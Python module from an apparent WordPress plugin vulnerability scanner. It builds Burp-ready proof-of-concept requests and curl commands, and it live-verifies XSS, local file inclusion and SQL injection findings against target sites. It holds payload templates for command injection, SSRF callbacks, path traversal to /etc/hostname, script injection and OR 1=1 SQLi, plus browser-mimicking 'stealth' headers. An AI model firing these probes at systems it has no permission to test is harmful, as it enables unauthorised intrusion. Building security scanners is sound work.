"""PoC construction and (opt-in) live verification for analyzer findings.

Goal: a finding nobody can reproduce gets ignored by site owners, so every
exploitable finding leaves the scanner as a Burp-ready artifact:

  - VERIFIED findings were reproduced against the target with a benign payload
  - every finding also lands in a PoC pack on disk
    (wpbuddy-audit/<host>/pocs/) as a raw HTTP request file that can be
    pasted straight into Burp Repeater, plus a copy-paste curl command

Auto-verification is deliberately conservative:
- only rules whose payload cannot alter state (no command execution, no SSRF
  callbacks, no data exfiltration - those get unverified PoCs only)
- benign markers only, one parameter at a time, capped attempts
- a finding is only 'reachable' when the PHP file answers HTTP 200 when
  requested directly under wp-content/ (the classic directly-accessible
  plugin endpoint); admin-registered handlers get templates instead

Mapping a source finding to a URL assumes the analyzed tree mirrors the
target layout: for code mirrored from a listing the finding path IS the URL
path (it starts at wp-content/...); for an official wordpress.org download
the path starts at the plugin slug, so wp-content/plugins/ is prefixed.
"""

import re
from datetime import datetime
from pathlib import Path
from urllib.parse import urlencode, urlsplit

from .. import config, httpclient, stealth

MARKER = "WpBuddyProbe7c9x"

# rules we can verify without any risk of changing state on the target
AUTO_RULES = {"xss-echo", "file-inclusion", "sqli-request"}

# rules whose vulnerable sink expects the parameter in a POST body
POST_RULES = {"request-unserialize", "backdoor-obfuscation", "csrf-no-nonce"}

# payload suggestions (never auto-executed outside AUTO_RULES)
TEMPLATE_PAYLOADS = {
    "command-exec": ";echo " + MARKER,
    "ssrf-request": "https://your-collaborator.example.net/wpbuddy",
    "request-unserialize": f'a:1:{{s:4:"test";s:{len(MARKER)}:"{MARKER}";}}',
    "backdoor-obfuscation": MARKER,
    "eval-usage": MARKER,
    "file-inclusion": "../../../../etc/hostname",
    "xss-echo": f"<script>console.log('{MARKER}')</script>",
    "sqli-request": "' OR 1=1 -- ",
    "sqli-no-prepare": "' OR 1=1 -- ",
    "csrf-no-nonce": MARKER,
}

SQL_ERROR_RE = re.compile(
    r"(sql syntax|mysqli?_|database error|wpdb|you have an error in your sql|"
    r"syntax error)", re.I)


def url_for_finding(finding, target, kind, mirrored):
    """Candidate URL where this PHP file would live on the target."""
    if mirrored:
        return target + finding["file"]  # mirrored paths already start with wp-content/
    return f"{target}wp-content/{kind}s/{finding['file']}"


# ---------------------------------------------------------------- PoC model

def build_poc(finding, url):
    """Machine-readable PoC: {'rule', 'method', 'url', 'params', 'payload', 'note'}."""
    rule = finding["rule"]
    payload = TEMPLATE_PAYLOADS.get(rule, MARKER)
    method = "POST" if rule in POST_RULES else "GET"
    params = {finding["params"][0]: payload} if finding.get("params") else None
    return {"rule": rule, "method": method, "url": url, "params": params,
            "payload": payload, "note": finding.get("description", "")}


def render_curl(poc):
    """Copy-paste shell command, safely quoted."""
    if not poc["params"]:
        return f"curl -i '{poc['url']}'"
    from shlex import quote
    key = next(iter(poc["params"]))
    if poc["method"] == "GET":
        pair = f"{key}={poc['payload']}"
        return f"curl -i -G {quote(poc['url'])} --data-urlencode {quote(pair)}"
    body = urlencode({key: poc["payload"]})
    return f"curl -i {quote(poc['url'])} -d {quote(body)}"


def render_raw_http(poc):
    """Raw HTTP/1.1 request text - paste into Burp Repeater as-is."""
    parts = urlsplit(poc["url"])
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    body = None
    if poc["method"] == "POST" and poc["params"]:
        body = urlencode(poc["params"])
    elif poc["params"]:
        path += ("&" if "?" in path else "?") + urlencode(poc["params"])

    persona = config.PERSONA
    headers = stealth.base_headers(persona) if persona else {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "*/*",
    }
    lines = [f"{poc['method']} {path} HTTP/1.1", f"Host: {parts.netloc}"]
    for name, value in headers.items():
        lines.append(f"{name}: {value}")
    lines.append("Connection: close")
    if body is not None:
        lines.append("Content-Type: application/x-www-form-urlencoded")
        lines.append(f"Content-Length: {len(body.encode())}")
        return "\r\n".join(lines) + "\r\n\r\n" + body
    return "\r\n".join(lines) + "\r\n\r\n"


def write_pack(directory, entries):
    """Write one raw-request file per PoC. entries: [(component, finding, poc)].

    Returns the list of files written.
    """
    directory = Path(directory)
    directory.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M")
    written = []
    for index, (component, finding, poc) in enumerate(entries, 1):
        name = f"POC-{index:03d}_{poc['rule']}.txt"
        path = directory / name
        header = (
            f"# WpBuddy PoC pack ({stamp}) - paste the request below into Burp Repeater\n"
            f"# Component: {component}\n"
            f"# Finding:   [{finding['severity']}] {poc['rule']} - {finding['description']}\n"
            f"# Source:    {finding['file']}:{finding['line']}\n"
            f"# Evidence:  {finding['snippet']}\n"
            f"# Verified live on target: {'YES' if finding.get('poc', {}).get('verified') else 'not verified - review before sending'}\n"
        )
        path.write_text(header + "\n" + render_raw_http(poc) + "\n", encoding="utf-8")
        written.append(path)
    return written


# ---------------------------------------------------------------- live verification

def try_verify(finding, url):
    """Benign live check of a finding at a reachable URL. Returns a dict or None.

    Result: {'verified': bool, 'evidence': str, 'poc': {...}}
    """
    if not finding.get("params"):
        return None
    rule, param = finding["rule"], finding["params"][0]
    poc = build_poc(finding, url)

    baseline = httpclient.get(url, retries=1)
    if baseline is None or baseline.status_code != 200:
        return None  # not directly reachable - manual PoC only

    if rule == "xss-echo":
        resp = httpclient.get(url, params={param: MARKER}, retries=1)
        if resp is not None and resp.status_code == 200 and MARKER in resp.text \
                and resp.text != baseline.text:
            poc["params"] = {param: f"<script>console.log('{MARKER}')</script>"}
            return {"verified": True, "rule": rule, "poc": poc,
                    "evidence": f"marker `{MARKER}` sent as ?{param}= came back unescaped "
                                f"in the response body"}

    elif rule == "file-inclusion":
        for payload in ("../../../../etc/hostname",
                        "php://filter/convert.base64-encode/resource=readme.html"):
            resp = httpclient.get(url, params={param: payload}, retries=1)
            if resp is None or resp.status_code != 200 or resp.text == baseline.text:
                continue
            poc["params"] = {param: payload}
            return {"verified": True, "rule": rule, "poc": poc,
                    "evidence": f"request with ?{param}={payload} returned a DIFFERENT body "
                                f"than the baseline request - server-side file content "
                                f"influenced by the parameter (local file inclusion)"}

    elif rule == "sqli-request":
        resp = httpclient.get(url, params={param: "' " + MARKER}, retries=1)
        if resp is not None and resp.status_code == 200 and resp.text != baseline.text \
                and SQL_ERROR_RE.search(resp.text) and not SQL_ERROR_RE.search(baseline.text):
            poc["params"] = {param: "' OR 1=1 -- "}
            return {"verified": True, "rule": rule, "poc": poc,
                    "evidence": f"a quote in ?{param}= triggered a SQL error message in the "
                                f"response (error-based SQL injection)"}

    return None


def verify_findings(report, target, kind, findings, mirrored, limit=config.MAX_POC_VERIFICATIONS):
    """Attach verification/PoC info to findings. Returns findings with a 'poc' key."""
    budget = limit
    for finding in findings:
        if budget <= 0:
            break
        url = url_for_finding(finding, target, kind, mirrored)
        if finding["rule"] in AUTO_RULES and finding.get("params"):
            result = try_verify(finding, url)
            budget -= 1
            if result and result["verified"]:
                finding["poc"] = result
                print(f"[!] PoC VERIFIED on target: {finding['rule']} at {url}")
                continue
        finding["poc"] = {"verified": False, "rule": finding["rule"],
                          "poc": build_poc(finding, url)}
    return findings
